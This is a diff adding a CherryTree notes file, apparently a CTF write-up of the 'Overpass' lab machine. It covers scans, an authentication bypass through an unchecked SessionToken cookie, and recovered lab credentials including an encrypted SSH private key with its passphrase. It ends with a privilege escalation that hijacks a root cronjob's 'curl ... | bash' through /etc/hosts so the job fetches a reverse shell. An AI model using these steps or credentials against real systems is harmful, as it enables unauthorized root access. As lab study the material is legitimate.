@@ -1,0 +1,178 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <bookmarks list=""/>
+  <node name="Overpass" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1629979210" ts_lastsave="1629981723">
+    <node name="Port Scan" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1629979314" ts_lastsave="1629981311">
+      <rich_text>First 65533 ports:
+nmap -sS -vv -sV -oN scanResult -p- 10.10.50.12
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    syn-ack ttl 63 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kerne</rich_text>
+    </node>
+    <node name="HTTP" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1629979411" ts_lastsave="1629982129">
+      <rich_text>- nmap
+   → Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+- Wappalyzer
+   → no technologies detected
+- dirsearch:
+   [08:04:46] Starting: 
+	[08:04:47] 301 -    0B  - /%2e%2e//google.com  -&gt;  /google.com             
+	[08:04:52] 200 -  782B  - /404.html                                         
+	[08:04:53] 301 -    0B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js  -&gt;  /Citrix/AccessPlatform/auth/clientscripts/cookies.js
+	[08:04:56] 301 -    0B  - /aboutus  -&gt;  aboutus/                            
+	[08:04:57] 301 -    0B  - /adm/index.html  -&gt;  ./                           
+	[08:04:57] 301 -   42B  - /admin  -&gt;  /admin/                               
+	[08:04:57] 200 -    1KB - /admin.html                                       
+	[08:04:57] 200 -    1KB - /admin/?/login                                    
+	[08:04:57] 200 -    1KB - /admin/                                           
+	[08:04:58] 301 -    0B  - /admin/index.html  -&gt;  ./                         
+	[08:04:58] 301 -    0B  - /admin2/index.html  -&gt;  ./                        
+	[08:04:58] 301 -    0B  - /admin_area/index.html  -&gt;  ./                    
+	[08:05:01] 301 -    0B  - /adminarea/index.html  -&gt;  ./                     
+	[08:05:02] 301 -    0B  - /admincp/index.html  -&gt;  ./                       
+	[08:05:02] 301 -    0B  - /administrator/index.html  -&gt;  ./                 
+	[08:05:06] 301 -    0B  - /bb-admin/index.html  -&gt;  ./                      
+	[08:05:08] 301 -    0B  - /cgi-bin/index.html  -&gt;  ./                       
+	[08:05:10] 301 -    0B  - /core/latest/swagger-ui/index.html  -&gt;  ./        
+	[08:05:11] 301 -    0B  - /css  -&gt;  css/                                    
+	[08:05:12] 301 -    0B  - /demo/ejb/index.html  -&gt;  ./                      
+	[08:05:12] 301 -    0B  - /doc/html/index.html  -&gt;  ./                      
+	[08:05:12] 301 -    0B  - /docs/html/index.html  -&gt;  ./                     
+	[08:05:12] 301 -    0B  - /docs/html/admin/index.html  -&gt;  ./               
+	[08:05:12] 200 -    2KB - /downloads/                                       
+	[08:05:12] 301 -    0B  - /downloads  -&gt;  downloads/                        
+	[08:05:13] 301 -    0B  - /engine/classes/swfupload//swfupload_f9.swf  -&gt;  /engine/classes/swfupload/swfupload_f9.swf
+	[08:05:13] 301 -    0B  - /engine/classes/swfupload//swfupload.swf  -&gt;  /engine/classes/swfupload/swfupload.swf
+	[08:05:13] 301 -    0B  - /estore/index.html  -&gt;  ./                        
+	[08:05:13] 301 -    0B  - /examples/servlets/index.html  -&gt;  ./             
+	[08:05:14] 301 -    0B  - /extjs/resources//charts.swf  -&gt;  /extjs/resources/charts.swf
+	[08:05:16] 301 -    0B  - /html/js/misc/swfupload//swfupload.swf  -&gt;  /html/js/misc/swfupload/swfupload.swf
+	[08:05:17] 301 -    0B  - /img  -&gt;  img/                                    
+	[08:05:17] 301 -    0B  - /index.html  -&gt;  ./                               
+	[08:05:20] 200 -    2KB - /login.js                                         
+	[08:05:21] 200 -   28B  - /main.js                                          
+	[08:05:21] 301 -    0B  - /manual/index.html  -&gt;  ./                        
+	[08:05:22] 301 -    0B  - /mifs/user/index.html  -&gt;  ./                     
+	[08:05:22] 301 -    0B  - /modelsearch/index.html  -&gt;  ./                   
+	[08:05:25] 301 -    0B  - /panel-administracion/index.html  -&gt;  ./          
+	[08:05:26] 301 -    0B  - /phpmyadmin/docs/html/index.html  -&gt;  ./          
+	[08:05:26] 301 -    0B  - /phpmyadmin/doc/html/index.html  -&gt;  ./           
+	[08:05:33] 301 -    0B  - /siteadmin/index.html  -&gt;  ./                     
+	[08:05:36] 301 -    0B  - /swagger/index.html  -&gt;  ./                       
+	[08:05:37] 301 -    0B  - /templates/index.html  -&gt;  ./                     
+	[08:05:37] 301 -    0B  - /tiny_mce/plugins/imagemanager/pages/im/index.html  -&gt;  ./
+	[08:05:41] 301 -    0B  - /webadmin/index.html  -&gt;  ./                      
+	[08:05:41] 301 -    0B  - /webdav/index.html  -&gt;  ./    
+- stepping through site:
+   → index.html
+      ⇒ comment: &lt;!--Yeah right, just because the Romans used it doesn't make it military grade, change this?--&gt;
+         • are they using ceasar cipher?
+   → /aboutus
+      ⇒ possible usernames
+         • Ninja
+         • Pars
+         • Szymex
+         • Bee
+         • MuirlandOracle
+   → /downloads
+      ⇒ links to builds of overpass
+      ⇒ link to source code of overpass
+      ⇒ link to buildscript.sh
+   → /admin
+      ⇒ login form username:password to POST /api/login
+         • trying sql injection on this form
+            ◇ didnt work
+      ⇒ login.js
+         • sets cookie SessionToken after login
+            ◇ tried to set this Cookie with “value”
+               ▪ it worked
+               ▪ backend only checks if SessionToken cookie is set, but not the value
+      ⇒ after fake loogin</rich_text>
+    </node>
+    <node name="Credentials" unique_id="4" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1629979809" ts_lastsave="1629982733">
+      <rich_text>⇒ possible usernames
+         • Ninja
+         • Pars
+         • Szymex
+         • Bee
+         • MuirlandOracle
+         • Steve
+         • Paradox
+       
+- ssh keys
+james
+passphrase for private key: james13
+----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337
+
+LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
+JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
+73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
+WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
+BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
+AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
+3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
+ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
+VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
+OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
+9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
+eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
+4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
+GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
+exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
+AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
+6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
+dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
+n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
+8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
+4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
+ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
+49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
++hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
+2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
+-----END RSA PRIVATE KEY-----
+
+- credentials
+   → james:saydrawnlyingpicture</rich_text>
+    </node>
+    <node name="Downloads" unique_id="5" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1629980315" ts_lastsave="1629980684">
+      <rich_text>- overpass.go
+   → func rot47 found
+   → storing passwords in form [{"name":"test","pass":"test"}]
+   → and uses rot47 for encryption and decryption</rich_text>
+    </node>
+    <node name="SSH" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1629981723" ts_lastsave="1629985699">
+      <rich_text>- found private key of user james and successfully logged in
+- found user.txt with first flag in /home/james
+- found todo.txt in /home/james
+&gt; Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
+&gt; Write down my password somewhere on a sticky note so that I don't forget it.
+  Wait, we make a password manager. Why don't I just use that?
+&gt; Test Overpass for macOS, it builds fine but I'm not sure it actually works
+&gt; Ask Paradox how he got the automated build script working and where the builds go.
+  They're not updating on the website
+- maybe james password is in .overpass save file
+- found .overpass file and decrypted it with rot47
+   → [{"name":"System","pass":"saydrawnlyingpicture"}]
+
+
+Privilege escalation
+
+- sudo -l
+   → james cannot use sudo on anything
+- run linpeas.sh for privilege escaltion enumeration
+   → * * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
+      ⇒ buildscript.sh get downloaded from overpass.thm/downloads/src/buildscript.sh and executed in bash as root
+      ⇒ check /etc/hosts to maybe change overpass.thm to own ip addr
+      ⇒ is possible
+      ⇒ setup http server that serves /downloads/src/buildscript.sh 
+      ⇒ content of buildscript.sh is a reverse shell
+      ⇒ after some time the cronjob will donwload the reverse shell payload from my server
+      ⇒ boom reverse shell with root rights
+      ⇒ /root/root.txt with second flag is accessable
+   → tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -  
+</rich_text>
+    </node>
+  </node>
+</cherrytree>
